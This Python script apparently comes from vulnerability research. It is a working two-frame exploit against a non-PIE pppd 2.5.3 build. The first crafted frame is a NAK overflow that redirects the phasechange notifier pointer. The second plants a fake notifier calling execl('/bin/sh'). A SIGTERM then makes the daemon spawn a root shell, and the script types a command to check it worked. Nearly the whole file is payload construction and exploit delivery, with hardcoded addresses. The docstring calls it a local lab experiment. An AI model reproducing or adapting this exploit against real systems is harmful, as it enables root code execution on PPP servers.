#!/usr/bin/env python3
"""Local-only two-frame control-flow experiment on pinned non-PIE pppd 2.5.3.

Frame 1 is the chosen-value NAK overflow: it sets the low half of the NULL
`phasechange` notifier pointer to an odd address inside inpacket_buf. Frame 2
is a malformed LCP ConfReq whose whole body is rejected verbatim into
inpacket_buf, so it supplies a fake `struct notifier` at that address with
`func = execl@plt` and `arg = "/bin/sh"`. A signal then drives pppd to
new_phase(PHASE_DEAD), whose notify(phasechange, 0) calls
`execl("/bin/sh", NULL, ...)` in the live daemon. We then type a benign
command on the same local pty and look for its side effect.

No external network, no public target. This is a research experiment, not a
claim until replayed by the witness.
"""
import argparse
import fcntl
import json
import os
import pty
import select
import struct
import subprocess
import sys
import termios
import time
from pathlib import Path

from chosen_write import fcs16, stuff, set_raw, frame_for, drain, find_pid

ROOT = Path(__file__).resolve().parent
LOGDIR = ROOT / "raw"
LOGDIR.mkdir(exist_ok=True)
SECRETS = Path("/run/pppd2shell-live/chap-secrets")

# Non-PIE 2.5.3 build: nm / objdump of raw/build-vuln-nopie/pppd/pppd
NAK_BUFFER = 0x467A40
INPACKET = 0x468820
REQCI_INP = INPACKET + 8          # main.c p+=PPP_HDRLEN; fsm.c inp+=HEADERLEN
EXECL_PLT = 0x40CC00              # objdump: <execl@plt>
PHASECHANGE_OFF = 1840            # 0x468170 - NAK_BUFFER
NOTIFIER_OFF = 4                  # body offset of the fake notifier
FORCE_BIT = 9                     # escape 09; bit 9 is set in bswap(notifier)


def hdlc(info: bytes) -> bytes:
    core = bytes((0xFF, 0x03)) + struct.pack("!H", 0xC021) + info
    f = fcs16(core)
    return b"\x7e" + stuff(core + bytes((f & 0xFF, f >> 8))) + b"\x7e"


def rej_frame(body: bytes) -> bytes:
    return hdlc(struct.pack("!BBH", 1, 2, 4 + len(body)) + body)

def frame_for_swapped(target: int, be_value: int, force_bit: int):
    """Write be_value as the big-endian NAK value at `target`.

    PUTLONG writes network order, so a little-endian pointer P must be
    supplied as bswap(P).  `escape NN` sets ao->asyncmap bit NN; a CI is
    NAKed only when that bit is clear in the CI, so force_bit must be a bit
    that is SET in be_value, and we clear it in the request CI.
    """
    mask = 1 << force_bit
    assert be_value & mask, "forced bit must be set in the target value"
    ci_value = be_value & ~mask
    pad = next(p for p in range(6) if (target - 2 - 5 * p) % 6 == 0)
    while target + 4 - pad > 1496:
        pad += 6
    count = (target - 2 - 5 * pad) // 6
    assert count >= 0
    pap = bytes((3, 4, 0xC0, 0x23))
    async_ci = bytes((2, 6)) + struct.pack("!I", ci_value)
    body = pap * pad + async_ci * (count + 1)
    info = struct.pack("!BBH", 1, 3, 4 + len(body)) + body
    return hdlc(info), {
        "target_offset": target,
        "pap_cis": pad,
        "async_cis": count + 1,
        "info_len": len(info),
        "be_nak_value": f"{be_value:08x}",
        "forced_bit": force_bit,
        "ci_value": f"{ci_value:08x}",
    }


def build_frames(marker: str):
    notifier_addr = REQCI_INP + NOTIFIER_OFF
    be_value = int.from_bytes(struct.pack("<I", notifier_addr), "big")
    naka, layout = frame_for_swapped(PHASECHANGE_OFF, be_value, FORCE_BIT)

    # Body: bad CI length (00 00) makes lcp_reqci reject the whole body
    # verbatim.  rejp == inp, so no BCOPY from nak_buffer overwrites it.
    shell = b"/bin/sh\x00"
    shell_addr = REQCI_INP + NOTIFIER_OFF + 24
    body = bytearray(b"\x00\x00\x41\x41")
    body += struct.pack("<Q", 0)                 # notifier.next = NULL
    body += struct.pack("<Q", EXECL_PLT)         # notifier.func
    body += struct.pack("<Q", shell_addr)        # notifier.arg
    body += shell
    assert len(body) == 4 + 24 + 8
    return naka, rej_frame(bytes(body)), layout, {
        "notifier_addr": f"0x{notifier_addr:x}",
        "execl_plt": f"0x{EXECL_PLT:x}",
        "shell_addr": f"0x{shell_addr:x}",
        "rej_body": bytes(body).hex(),
    }



def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--binary", required=True)
    ap.add_argument("--command", required=True,
                    help="benign command typed on the pty after the switch")
    ap.add_argument("--marker", required=True)
    a = ap.parse_args()

    out = Path("/tmp") / f"pppd2shell-r5-{a.marker}"
    out.unlink(missing_ok=True)
    naka, rej, layout, detail = build_frames(a.marker)
    (LOGDIR / f"{a.marker}-nak.bin").write_bytes(naka)
    (LOGDIR / f"{a.marker}-rej.bin").write_bytes(rej)

    secrets_local = LOGDIR / "chap-secrets"
    secrets_local.write_text('"labserver"\t*\t"labsecret"\t*\n'
                             '"labpeer"\t*\t"labsecret"\t*\n')
    subprocess.run(["sudo", "-n", "mkdir", "-p", str(SECRETS.parent)], check=True)
    subprocess.run(["sudo", "-n", "install", "-o", "root", "-g", "root",
                    "-m", "0600", str(secrets_local), str(SECRETS)], check=True)

    master, slave = pty.openpty()
    set_raw(slave)
    slave_name = os.ttyname(slave)
    log_path = LOGDIR / f"{a.marker}-pppd.log"
    env = dict(os.environ)
    env["ASAN_OPTIONS"] = "detect_leaks=0"
    cmd = [
        "sudo", "-n", "env", "ASAN_OPTIONS=detect_leaks=0", a.binary,
        "nodetach", "passive", "local", "refuse-pap", "refuse-eap",
        "noip", "noipv6", "noproxyarp", "nolock", "debug",
        "escape", "09", "chap-secrets", str(SECRETS), "name", "labserver",
        slave_name,
    ]
    with open(log_path, "wb") as log:
        proc = subprocess.Popen(cmd, stdin=subprocess.DEVNULL, stdout=log,
                                stderr=subprocess.STDOUT, env=env,
                                close_fds=True)
    os.close(slave)
    fcntl.fcntl(master, fcntl.F_SETFL, os.O_NONBLOCK)
    early = drain(master, proc, 2.0)
    os.write(master, naka)
    after_nak = drain(master, proc, 1.0)
    os.write(master, rej)
    after_rej = drain(master, proc, 1.0)

    (LOGDIR / f"{a.marker}-early.bin").write_bytes(bytes(early))
    (LOGDIR / f"{a.marker}-after-nak.bin").write_bytes(bytes(after_nak))
    (LOGDIR / f"{a.marker}-after-rej.bin").write_bytes(bytes(after_rej))

    live_pid = find_pid(a.binary, slave_name)
    if live_pid is not None:
        gdb_cmds = [
            "set pagination off",
            "x/16xb 0x46882c",
            "x/s 0x468844",
            "detach",
        ]
        gargs = ["sudo", "-n", "gdb", "-q", "-batch", "-p", str(live_pid)]
        for c in gdb_cmds:
            gargs += ["-ex", c]
        try:
            gdb_txt = subprocess.run(gargs, capture_output=True, text=True,
                                     timeout=30).stdout
        except (subprocess.TimeoutExpired, OSError) as exc:
            gdb_txt = f"gdb failed: {exc}\n"
        (LOGDIR / f"{a.marker}-pre-signal-gdb.txt").write_text(gdb_txt)
        print(gdb_txt)

    target_pid = find_pid(a.binary, slave_name)
    if target_pid is None:
        target_pid = proc.pid
    subprocess.run(["sudo", "-n", "kill", "-TERM", str(target_pid)],
                   check=False)
    after_term = drain(master, proc, 2.0)
    (LOGDIR / f"{a.marker}-after-term.bin").write_bytes(bytes(after_term))

    # If execl succeeded, fd 0 of this process family is now /bin/sh.
    try:
        os.write(master, (a.command + "\n").encode())
    except OSError:
        pass
    after_cmd = drain(master, proc, 2.0)
    (LOGDIR / f"{a.marker}-after-cmd.bin").write_bytes(bytes(after_cmd))
    side_effect = out.exists()
    if side_effect:
        (LOGDIR / f"{a.marker}-side-effect.txt").write_text(
            out.read_text(errors="replace"))

    rc = proc.poll()
    if rc is None:
        proc.terminate()
        try:
            proc.wait(timeout=3)
        except subprocess.TimeoutExpired:
            proc.kill()
            proc.wait(timeout=3)
    os.close(master)
    summary = {
        "marker": a.marker,
        "binary": a.binary,
        "process_rc": rc,
        "side_effect_file": str(out),
        "side_effect_observed": side_effect,
        "nak_layout": layout,
        **detail,
        "after_term_preview": repr(bytes(after_term)[:160]),
        "after_cmd_preview": repr(bytes(after_cmd)[:160]),
    }
    (LOGDIR / f"{a.marker}-summary.json").write_text(
        json.dumps(summary, indent=2))
    print(json.dumps(summary, indent=2))
    return 0 if side_effect else 1


if __name__ == "__main__":
    sys.exit(main())
